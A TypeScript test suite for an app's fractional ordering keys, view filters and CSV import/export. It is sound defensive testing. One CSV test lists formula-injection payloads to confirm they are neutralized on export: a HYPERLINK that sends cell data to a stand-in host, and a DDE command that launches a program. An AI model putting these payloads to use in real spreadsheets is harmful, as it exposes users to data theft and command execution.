import { describe, expect, test } from "bun:test";
import { applyProps, type PropDef, parsePropText } from "../props";
import { CsvError, inferColumns, matchHeader, parseCsv, protectCell, toCsv, uniqueNames } from "./csv";
import { isPosition, keyBetween, keysBetween, PositionError } from "./position";
import {
  checkFilter,
  effectiveFilter,
  type Filter,
  filterKind,
  pruneFilter,
  type RowView,
  resolveDay,
  rowMatches,
  viewConfigSchema,
} from "./view";

describe("fractional position", () => {
  test("between, before and after, always in byte order", () => {
    const a = keyBetween(null, null);
    const b = keyBetween(a, null);
    const mid = keyBetween(a, b);
    const first = keyBetween(null, a);
    expect([first, a, mid, b].every(isPosition)).toBe(true);
    expect(first < a && a < mid && mid < b).toBe(true);
  });

  test("1,000 insertions at the same place stay ordered and short enough", () => {
    let lo = keyBetween(null, null);
    const hi = keyBetween(lo, null);
    const keys = [lo, hi];
    for (let i = 0; i < 1000; i++) {
      lo = keyBetween(lo, hi);
      keys.push(lo);
    }
    const sorted = [...keys].sort();
    expect(new Set(keys).size).toBe(keys.length);
    expect(sorted[0]).toBe(keys[0]);
    // the algorithm's worst case: each insertion in the same gap spends ~1 bit; 1,000 in a row give ~170 characters
    expect(Math.max(...keys.map((k) => k.length))).toBeLessThan(400);
  });

  test("100 thousand keys at once (CSV): ordered, unique and short", () => {
    const keys = keysBetween(null, null, 100_000);
    for (let i = 1; i < keys.length; i++) expect((keys[i - 1] as string) < (keys[i] as string)).toBe(true);
    expect(Math.max(...keys.map((k) => k.length))).toBeLessThanOrEqual(5);
    const between = keysBetween(keys[10] as string, keys[11] as string, 500);
    expect(between.every((k) => k > (keys[10] as string) && k < (keys[11] as string))).toBe(true);
  });

  test("an invalid or out-of-order key is rejected", () => {
    expect(isPosition("a0")).toBe(true);
    expect(isPosition("a00")).toBe(false); // trailing zero
    expect(isPosition("a")).toBe(false);
    expect(isPosition("!x")).toBe(false);
    expect(() => keyBetween("a1", "a0")).toThrow(PositionError);
    expect(() => keyBetween("a1", "a1")).toThrow(PositionError);
  });
});

const DEFS: PropDef[] = [
  { id: "t", name: "Name", type: "text" },
  { id: "n", name: "Value", type: "number" },
  {
    id: "s",
    name: "Status",
    type: "status",
    options: [
      { id: "todo", name: "To do" },
      { id: "inProgress", name: "In progress" },
      { id: "done", name: "Done" },
    ],
    groups: { todo: ["todo"], inProgress: ["inProgress"], done: ["done"] },
  },
  {
    id: "m",
    name: "Tags",
    type: "multi_select",
    options: [
      { id: "a", name: "a" },
      { id: "b", name: "b" },
    ],
  },
  { id: "d", name: "When", type: "date" },
  { id: "c", name: "Ok", type: "checkbox" },
  { id: "p", name: "Who", type: "person" },
  { id: "ct", name: "Created", type: "created_time" },
  {
    id: "f",
    name: "Double",
    type: "formula",
    formula: { expression: 'prop("n") * 2', resultType: "number" },
  },
];

const NOW = Date.UTC(2026, 9, 22, 12);

function rowOf(props: Record<string, unknown>, computed: Record<string, unknown> = {}): RowView {
  return {
    props,
    computed,
    createdAt: "2026-10-21T23:59:00.000Z",
    editedAt: "2026-10-22T10:00:00.000Z",
    createdBy: { type: "person", id: "u1" },
    editedBy: null,
  };
}

const match = (f: Filter, r: RowView) =>
  rowMatches(f, DEFS, r, { now: NOW, me: { type: "person", id: "u1" } });

describe("filter (oracle)", () => {
  test("text: contains without case, empty counts as different", () => {
    const r = rowOf({ t: "Crème Brûlée" });
    expect(match({ prop: "t", op: "contains", value: "CRÈME" }, r)).toBe(true);
    expect(match({ prop: "t", op: "starts_with", value: "crème" }, r)).toBe(true);
    expect(match({ prop: "t", op: "eq", value: "crème brûlée" }, r)).toBe(false);
    expect(match({ prop: "t", op: "neq", value: "x" }, rowOf({}))).toBe(true);
    expect(match({ prop: "t", op: "not_contains", value: "x" }, rowOf({}))).toBe(true);
    expect(match({ prop: "t", op: "empty" }, rowOf({ t: "" }))).toBe(true);
  });

  test("number, option, status group, multi, checkbox, person", () => {
    const r = rowOf({ n: 5, s: "inProgress", m: ["a"], c: true, p: [{ type: "person", id: "u1" }] });
    expect(match({ prop: "n", op: "gt", value: 4 }, r)).toBe(true);
    expect(match({ prop: "n", op: "lte", value: 4 }, r)).toBe(false);
    expect(match({ prop: "n", op: "neq", value: 5 }, rowOf({}))).toBe(true);
    expect(match({ prop: "n", op: "gt", value: -1 }, rowOf({}))).toBe(false);
    expect(match({ prop: "s", op: "group", value: "inProgress" }, r)).toBe(true);
    expect(match({ prop: "s", op: "in", value: ["todo", "done"] }, r)).toBe(false);
    expect(match({ prop: "s", op: "not_in", value: ["todo"] }, rowOf({}))).toBe(true);
    expect(match({ prop: "m", op: "has", value: "a" }, r)).toBe(true);
    expect(match({ prop: "m", op: "has_all", value: ["a", "b"] }, r)).toBe(false);
    expect(match({ prop: "m", op: "has_any", value: ["b", "a"] }, r)).toBe(true);
    expect(match({ prop: "c", op: "eq", value: false }, rowOf({}))).toBe(true);
    expect(match({ prop: "p", op: "has", value: "me" }, r)).toBe(true);
    expect(match({ prop: "p", op: "has_not", value: { type: "agent", id: "u1" } }, r)).toBe(true);
  });

  test("dates by day (UTC), relative to today, created at", () => {
    const r = rowOf({ d: { start: "2026-10-22T09:00:00Z", end: "2026-10-30" } });
    expect(match({ prop: "d", op: "eq", value: { rel: "today" } }, r)).toBe(true);
    expect(match({ prop: "d", op: "before", value: { rel: "tomorrow" } }, r)).toBe(true);
    expect(match({ prop: "d", op: "between", value: ["2026-10-01", "2026-10-22"] }, r)).toBe(true);
    expect(match({ prop: "d", op: "after", value: "2026-10-22" }, r)).toBe(false);
    expect(match({ prop: "ct", op: "eq", value: { rel: "yesterday" } }, r)).toBe(true);
    expect(resolveDay({ rel: "one_month_ago" }, Date.UTC(2026, 2, 31))).toBe("2026-03-03");
  });

  test("a formula with an error counts as empty", () => {
    expect(match({ prop: "f", op: "empty" }, rowOf({}, { f: { err: "division_by_zero" } }))).toBe(true);
    expect(match({ prop: "f", op: "gt", value: 1 }, rowOf({}, { f: 4 }))).toBe(true);
  });

  test("and/or groups, an empty group does not restrict", () => {
    const r = rowOf({ n: 5, t: "x" });
    expect(
      match({ and: [{ prop: "n", op: "eq", value: 5 }, { or: [{ prop: "t", op: "eq", value: "y" }] }] }, r),
    ).toBe(false);
    expect(
      match(
        {
          or: [
            { prop: "n", op: "eq", value: 1 },
            { prop: "t", op: "eq", value: "x" },
          ],
        },
        r,
      ),
    ).toBe(true);
    expect(match({ and: [] }, r)).toBe(true);
    expect(match({ or: [] }, r)).toBe(true);
  });

  test("checkFilter rejects property, operator and depth", () => {
    expect(checkFilter({ prop: "x", op: "eq", value: 1 }, DEFS)).toEqual(["unknown_prop:x"]);
    expect(checkFilter({ prop: "n", op: "contains", value: "1" }, DEFS)).toEqual(["bad_op:n:contains"]);
    expect(checkFilter({ prop: "n", op: "gt" }, DEFS)).toEqual(["bad_value:n:gt"]);
    expect(checkFilter({ and: [{ or: [{ and: [{ prop: "n", op: "empty" }] }] }] }, DEFS)).toEqual([
      "too_deep",
    ]);
    expect(filterKind(DEFS[8] as PropDef)).toBe("number");
  });

  test("a value with the wrong shape is rejected before reaching SQL", () => {
    // adversarial review: eq with a list on a status was true in SQL and false here; a person with a list
    // became invalid SQL (500) and stayed saved in the view
    const bad: [string, string, unknown][] = [
      ["s", "eq", ["done"]],
      ["s", "neq", ["done"]],
      ["s", "in", "done"],
      ["s", "group", "later"],
      ["p", "has", ["x"]],
      ["p", "has", true],
      ["m", "has_any", "a"],
      ["n", "gt", "5"],
      ["t", "contains", 5],
      ["d", "before", "tomorrow"],
      ["d", "between", [{ rel: "today" }]],
      ["c", "eq", "true"],
    ];
    for (const [prop, op, value] of bad)
      expect(checkFilter({ prop, op, value } as Filter, DEFS)).toEqual([`bad_value:${prop}:${op}`]);
    expect(checkFilter({ prop: "p", op: "has", value: "me" }, DEFS)).toEqual([]);
    expect(checkFilter({ prop: "s", op: "in", value: ["done"] }, DEFS)).toEqual([]);
    expect(checkFilter({ prop: "t", op: "empty", value: 3 } as Filter, DEFS)).toEqual([]);
  });

  test("pruneFilter removes only the conditions the current schema rejects", () => {
    const f: Filter = {
      and: [
        { prop: "n", op: "gt", value: 1 },
        { or: [{ prop: "gone", op: "eq", value: "x" }] },
        { prop: "s", op: "eq", value: "done" },
      ],
    };
    const withoutStatus = DEFS.filter((d) => d.id !== "s");
    expect(pruneFilter(f, DEFS)).toEqual({
      and: [
        { prop: "n", op: "gt", value: 1 },
        { prop: "s", op: "eq", value: "done" },
      ],
    });
    expect(pruneFilter(f, withoutStatus)).toEqual({ and: [{ prop: "n", op: "gt", value: 1 }] });
    expect(pruneFilter({ prop: "gone", op: "empty" }, DEFS)).toBeNull();
  });

  test("quick filters join the effective filter only with a value", () => {
    const cfg = viewConfigSchema.parse({
      filter: { prop: "n", op: "gt", value: 1 },
      quickFilters: [{ prop: "s", value: "done" }, { prop: "m" }, { prop: "t", op: "empty" }],
    });
    expect(effectiveFilter(cfg, DEFS)).toEqual({
      and: [
        { prop: "n", op: "gt", value: 1 },
        { prop: "s", op: "eq", value: "done" },
        { prop: "t", op: "empty" },
      ],
    });
    expect(effectiveFilter({}, DEFS)).toBeNull();
  });

  test("view config rejects an unknown key", () => {
    expect(viewConfigSchema.safeParse({ filters: 1 }).success).toBe(false);
    expect(viewConfigSchema.safeParse({ columns: [{ prop: "x", width: 5 }] }).success).toBe(false);
  });
});

describe("CSV", () => {
  test("quotes, doubled quotes, line breaks, BOM, CRLF and semicolons", () => {
    expect(parseCsv('﻿a,b\r\n"x, y","says ""hi"""\r\n"line\none",2\n')).toEqual([
      ["a", "b"],
      ["x, y", 'says "hi"'],
      ["line\none", "2"],
    ]);
    expect(parseCsv("a;b\n1;2")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
    expect(parseCsv("a\tb\n1\t2")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
    expect(parseCsv("a,b\n\n1,2\n")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
  });

  test("errors and limits", () => {
    expect(() => parseCsv('a\n"open')).toThrow(CsvError);
    expect(() => parseCsv("")).toThrow(CsvError);
    expect(() =>
      parseCsv("a\n1\n2\n3", { ...{ maxBytes: 1e6, maxRows: 2, maxCols: 10, maxCell: 100 } }),
    ).toThrow("too_many_rows");
    expect(() =>
      parseCsv(Array.from({ length: 11 }, () => "x").join(","), {
        maxBytes: 1e6,
        maxRows: 2,
        maxCols: 10,
        maxCell: 100,
      }),
    ).toThrow("too_many_columns");
  });

  test("round trip: what toCsv writes, parseCsv reads back the same (also with ; and tab in names)", () => {
    // adversarial review: the column "x;y;z;w;v" came back as 5 columns, because the reader took ; for
    // the separator
    const pieces = ["a", "x;y;z;w;v", "tab\there", 'quotes "q"', "line\nnew", ",", ";", "=1+1", "", "café"];
    let seed = 7;
    const pick = () => {
      seed = (seed * 1103515245 + 12345) % 2 ** 31;
      return pieces[seed % pieces.length] as string;
    };
    for (let k = 0; k < 300; k++) {
      const cols = 1 + (k % 4);
      const rows = Array.from({ length: 1 + (k % 3) }, () =>
        Array.from({ length: cols }, () => `${pick()}${pick()}`),
      );
      const header = rows[0] as string[];
      if (!header.some((h) => h !== "")) header[0] = "h";
      const back = parseCsv(toCsv(rows));
      // only the blank line (one empty column) disappears; ",," is a row of empty cells
      expect(back).toEqual(rows.filter((r, i) => i === 0 || r.length > 1 || r[0] !== ""));
    }
  });

  test("attack: a cell that becomes a spreadsheet formula goes out neutralized and comes back the same", () => {
    const evil = [
      '=HYPERLINK("http://mal.example/?"&A1,"click")',
      "+1+1",
      "@SUM(A1)",
      "-2+3",
      "\t=1",
      "=cmd|'/C calc'!A0",
    ];
    const csv = toCsv([["Name"], ...evil.map((e) => [e])]);
    for (const line of csv.split("\r\n").slice(1)) expect(line.replace(/^"/, "")).toMatch(/^'/);
    expect(protectCell("-5")).toBe("-5");
    expect(protectCell("-5,5")).toBe("-5,5");
    expect(protectCell("text")).toBe("text");
    expect(
      parseCsv(csv)
        .slice(1)
        .map((r) => r[0]),
    ).toEqual(evil);
  });

  test("type inference", () => {
    let n = 0;
    const cols = inferColumns(
      ["Name", "Value", "Paid", "When", "Site", "Stage", "Note", ""],
      [
        ["A", "1,5", "yes", "2026-10-01", "https://a.com", "New", "free", ""],
        ["B", "-2", "no", "2026-10-02", "http://b.com", "New", "text", ""],
        ["C", "3e2", "x", "2026-10-03T10:00:00Z", "https://c.com", "Old", "other", ""],
        ["D", "4", "no", "2026-10-04", "https://d.com", "Old", "more", ""],
      ],
      () => `o${++n}`,
    );
    expect(cols.map((c) => c.type)).toEqual([
      "text",
      "number",
      "checkbox",
      "date",
      "url",
      "select",
      "text",
      "text",
    ]);
    expect(cols[5]?.options?.map((o) => o.name)).toEqual(["New", "Old"]);
    expect(cols[7]?.name).toBe("Column 8");
  });

  test("unique names and header matched by name", () => {
    expect(uniqueNames(["A", "a", "B"], ["b"])).toEqual(["A", "a 2", "B 2"]);
    expect(matchHeader([" value ", "X"], DEFS).map((d) => d?.id ?? null)).toEqual(["n", null]);
  });
});

describe("CSV formula protection behind leading whitespace", () => {
  const back = (cell: string) => parseCsv(toCsv([["h"], [cell]]))[1]?.[0];

  test("a formula after leading whitespace is protected", () => {
    for (const cell of [" =1+1", " =1", "\n=SUM(A1)", "﻿+1", " \t@x", "  -x", " =1", "\r\n-1+1"]) {
      expect([cell, protectCell(cell).startsWith("'")]).toEqual([cell, true]);
      expect([cell, back(cell)]).toEqual([cell, cell]);
    }
  });

  test("numbers, plain text and whitespace-only cells stay as they are", () => {
    for (const cell of [" -5", "-5,5", " -5", " 3e2", "text", "   ", "", "'90s", "a=b"])
      expect([cell, protectCell(cell)]).toEqual([cell, cell]);
  });

  test("a cell that already starts with an apostrophe before a formula keeps its apostrophe", () => {
    expect(protectCell("'=x")).toBe("''=x");
    expect(back("'=x")).toBe("'=x");
    expect(back("'' =x")).toBe("'' =x");
    expect(back("' =x")).toBe("' =x");
  });

  test("property: any cell comes back from toCsv and parseCsv unchanged (20 thousand cells)", () => {
    const alphabet = ["'", "=", "+", "-", "@", " ", "\t", "\r", "\n", " ", "﻿", "1", "5", ",", ".", "a"];
    // 32-bit LCG with Math.imul: a plain multiply passes 2^53 and loses the low bits
    let seed = 20_261_114;
    const next = () => {
      seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0;
      return seed >>> 8;
    };
    let checked = 0;
    const failures: string[] = [];
    for (let k = 0; k < 20_000; k++) {
      const len = 1 + (next() % 8);
      let cell = "";
      for (let i = 0; i < len; i++) cell += alphabet[next() % alphabet.length];
      checked++;
      if (back(cell) !== cell) failures.push(JSON.stringify(cell));
    }
    expect({ checked, failures: failures.slice(0, 5) }).toEqual({ checked: 20_000, failures: [] });
  });
});

test("CSV inference only calls a column a date when its values can be applied", () => {
  for (const value of ["2026-11-01 10:00", "2026-11-01T10:00", "2026-02-30", "2026-11-01T10:00:00Z"]) {
    const col = inferColumns(["Title", "When"], [["A", value]], () => "o")[1];
    expect(col?.type).toBe(value.endsWith("Z") ? "date" : "text");
    const def: PropDef = { id: "d", name: "When", type: col?.type ?? "text" };
    const parsed = parsePropText(def, value);
    expect(applyProps([def], {}, { d: parsed }).ok).toBe(true);
    if (def.type === "text") expect(parsed).toBe(value);
  }
});
